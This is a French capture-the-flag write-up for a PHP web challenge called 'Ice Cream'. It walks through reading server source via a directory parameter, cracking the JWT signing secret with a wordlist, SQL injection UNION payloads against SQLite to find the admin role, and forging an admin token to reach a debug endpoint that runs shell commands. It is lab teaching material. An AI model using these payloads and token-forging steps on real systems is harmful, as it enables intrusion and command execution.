Ice Cream 
=============

On a un site web assez simple avec une seule requête et plusieurs argument possible : 

.. code-block:: console

    http://57.128.112.118:10570/?dir=ingredients&file=vanille
    http://57.128.112.118:10570/?dir=ingredients&file=secret

Lorsqu'on choisit l'ingrédient secret, celui ci refuse de s'afficher.

On va d'abord tester /etc/passwd avec une path traversal : 

.. code-block:: console

    http://57.128.112.118:10570/?dir=../../../../../../etc&file=passwd 
    ==> Access denied

On essaie alors simplement avec "/" : 

.. code-block:: console

    http://57.128.112.118:10570/?dir=/&file=passwd 
    
    <li onclick="location.href='?dir=%2F&file=admin.php'">admin.php</li>
    <li onclick="location.href='?dir=%2F&file=admin.txt'">admin.txt</li>
    <li onclick="location.href='?dir=%2F&file=auth.php'">auth.php</li>
    <li onclick="location.href='?dir=%2F&file=flavors.db'">flavors.db</li>
    <li onclick="location.href='?dir=%2F&file=index.php'">index.php</li>
    <li onclick="location.href='?dir=ingredients'">ingredients</li>
    <li onclick="location.href='?dir=%2F&file=jwt_secret.txt'">jwt_secret.txt</li>
    <li onclick="location.href='?dir=secrets'">secrets</li>
    <li onclick="location.href='?dir=%2F&file=styles.css'">styles.css</li></ul>


On peut maintenant lire les différents fichiers : 

- admin.php 

.. code-block:: php 

    <?php
    $canExecute = false;
    $secret = trim(file_get_contents('jwt_secret.txt'));

    $adminToken = trim(file_get_contents('admin.txt'));

    function base64url_encode($data) {
        return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
    }

    function base64url_decode($data) {
        return base64_decode(strtr($data, '-_', '+/'));
    }

    function verify_jwt_hs256($jwt, $secret) {
        $parts = explode('.', $jwt);
        if (count($parts) !== 3) return false;

        list($header_b64, $payload_b64, $sig_b64) = $parts;
        $expected_sig = base64url_encode(hash_hmac('sha256', "$header_b64.$payload_b64", $secret, true));

        if (!hash_equals($expected_sig, $sig_b64)) return false;

        return json_decode(base64url_decode($payload_b64), true);
    }

    if (isset($_COOKIE['auth']) && $_COOKIE['auth'] === $adminToken) {
        $canExecute = true;
    } else {
        $header = base64url_encode(json_encode(['alg' => 'HS256', 'typ' => 'JWT']));
        $payload = base64url_encode(json_encode(['role' => 'simple-utilisateur']));
        $signature = base64url_encode(hash_hmac('sha256', "$header.$payload", $secret, true));

        $jwt = "$header.$payload.$signature";

        setcookie('auth', $jwt, time() + 3600, "/");
        $_COOKIE['auth'] = $jwt;
    }

    if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['debug'])) {
        if (!$canExecute) {
            echo "<p>Tu ne peux pas executer de commandes avec debug tant que tu n'es pas authentifié en tant qu'admin</p>";
            exit;
        }

        $cmd = $_GET['debug'];
        $output = shell_exec($cmd);
        echo "<pre>$output</pre>";
        exit;
    }
    ?>


- auth.php 

.. code-block:: HTML 

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>'auth' cookie recherche</title>
        <link rel="stylesheet" href="styles.css">
    </head>
    <body>
        <div class="header-container">
            <h1>EN COURS DE DEVELOPPEMENT NE PAS UTILISER (signé le stagiaire)</h1>
            <p>La table 'auth' permettra de rechercher tous les types d'utilisateurs pour la future authentification</p>
            <p>example : simple-utilisateur</p>
        </div>

        <div class="form-container">
            <form action="" method="POST">
                <label for="ingredient">Type d'utilisateur:</label>
                <input type="text" id="ingredient" name="ingredient" placeholder="Type d'auth">
                <button type="submit">Recherche</button>
            </form>
        </div>
    </body>
    </html>

- index.php 

.. code-block:: php 

    <?php
    include_once('admin.php'); 
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Ice Cream Ingredients</title>
        <link rel="stylesheet" href="styles.css">
    </head>
    <body>
    <div class="header-container">
        <h1 class="main-title">PAPI GLACE, l'expert des glaces 3 boules</h1>
        <h2 class="subtitle">Découvrez tous les ingrédients exceptionnels qui font de nous le vendeur de glace numéro 1 à Cannes avec notre iconique glace a 3 boules</h2>
    </div>

    <div class="layout">
        <div class="container" id="ingredients">
            <?php
            if (isset($_GET['file']) && basename($_GET['file']) === 'auth.php') {
                include(__DIR__ . '/auth.php');
                exit;
            }

            $projectRoot = realpath(__DIR__);         
            $ingredientsDir = realpath(__DIR__ . '/ingredients'); 
            $requestedDir = isset($_GET['dir']) ? $_GET['dir'] : 'ingredients';
            $path = realpath($projectRoot . '/' . $requestedDir);

            if ($path === false || (strpos($path, $projectRoot) !== 0)) {
                die("Access denied.");
            }

            if (is_dir($path)) {
                $displayPath = $path === $ingredientsDir ? '/' : str_replace($projectRoot, '', $path);
                echo "<h1>Nos ingedients pour une glace comme fait notre papi: </h1>";
                echo "<ul>";

                $files = scandir($path);
                foreach ($files as $file) {
                    if ($file === '.' || $file === '..' || $file[0] === '.') continue;

                    $filePath = $path . '/' . $file;
                    $fileUrl = $requestedDir . '/' . $file;

                    if (is_dir($filePath)) {
                        $url = "?dir=" . urlencode(trim($fileUrl, '/'));
                        echo "<li onclick=\"location.href='" . $url . "'\">" . htmlspecialchars($file) . "</li>";
                    } else {
                        $url = "?dir=" . urlencode($requestedDir) . "&file=" . urlencode($file);
                        echo "<li onclick=\"location.href='" . $url . "'\">" . htmlspecialchars($file) . "</li>";
                    }                
                }
                echo "</ul>";
            } else {
                echo "<p>Dossier d'ingredients invalide.</p>";
            }
            ?>
        </div>

        <div class="content">
            <?php
            if (isset($_GET['file'])) {
                $requestedFile = basename($_GET['file']); 
                $filePath = $path . '/' . $requestedFile;

                if (strpos(realpath($filePath), $projectRoot) === 0) {
                    $mimeType = mime_content_type($filePath);
                    if (strpos($mimeType, 'image') === 0) {
                        echo "<p>Image file</p>";
                    } 
                    else if ($requestedFile === 'admin.txt') {
                        echo "<p>T'es pas admin je crois nan? </p>";
                    } else if ($requestedFile === 'flavors.db') {
                        echo "<p>Touche pas à ma db! </p>";
                    } else if ($requestedFile === 'jwt_secret.txt') {
                        echo "<p>Pas touche! </p>";
                    }
                    else {
                        echo "<h2>Notre " . htmlspecialchars($requestedFile) . ":</h2>";
                        echo "<div class='content-box'>" . htmlspecialchars(file_get_contents($filePath)) . "</div>";
                    }
                } else {
                    echo "<p>Ingredient invalide.</p>";
                }
            } 
            ?>
        </div>
    </div>
    </body>
    </html>

Les autres fichiers sont inaccessible, on peut tout même trouver l'ingrédient secret mais résultat : http://57.128.112.118:10570/?dir=%2Fsecrets&file=ingr%C3%A9dient+secret

"OH LE BAIT AHAHA..."

Jamais je ne mettrai mon ingredient secret dans un fichier visible comme ca.

signe Jonathan le stagiaire"

Donc on a besoin de la clé jwt pour forger un token admin et utiliser la fonctionnalité debug qui exécute des commandes. 

On va cracker la clé du JWT avec jwt_tool et rockyou : 

.. code-block:: console

    python3 jwt_tool -C -d rockyou.txt "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoic2ltcGxlLXV0aWxpc2F0ZXVyIn0.0jureYiNTgso9kOqPJoouKMhJmPg8fTZ1Lm0NPKIINM"

On obtient le mot de passe "icecream" 

On peut donc forger un nouveau token. 

Cependant cela ne fonctionne pas avec : 

- role = admin
- role = administrateur
- role = administrator
- role = papi
- role = simple-admin 
- role = simple-administrateur

Il faut qu'on trouve exactement ce que contient le token admin pour avoir exactement le même. 

En faites si on se rend sur : http://57.128.112.118:10570/?dir=%2F&file=auth.php 

On a alors un formulaire qui va nous permettre de trouver le bon rôle, probablement via une injection SQL 

Caractère interdits : = " 0 ( ) * 

.. code-block:: console

    1' UNION SELECT version --
    SQLite3::query(): Unable to prepare statement: 1, no such column: version in /var/www/html/auth.php on line 21
    Database Error: no such column: version

    1' UNION SELECT sql from sqlite_schema --
    CREATE TABLE "auth" ( id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(255) NOT NULL ) est un type d'auth

    1' UNION SELECT name from auth --
    PAPI-JE-SUIS-UN-ADMIN est un type d'auth.
    client est un type d'auth.
    simple-utilisateur est un type d'auth.

Il faut donc faire role = PAPI-JE-SUIS-UN-ADMIN

On le fait avec jwt_tool comme d'habitude

Pourtant cela ne fonctionne pas malgré l'utilisation de jwt_tool pour modifier et resigner le token.

Finalement il y avait un problème dans le challenge, on garde notre cookie de coté : 

.. code-block:: console

    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiUEFQSS1KRS1TVUlTLVVOLUFETUlOIn0.-nbupCaKoUpMjBNbrGRj904w1mJKwrCcQ2uLAGWgTlc

Une fois le challenge modifié on peut l'utiliser pour obtenir le flag via la fonction debug, le fichier est caché dans le dossiers "secrets"

Flag : pas noté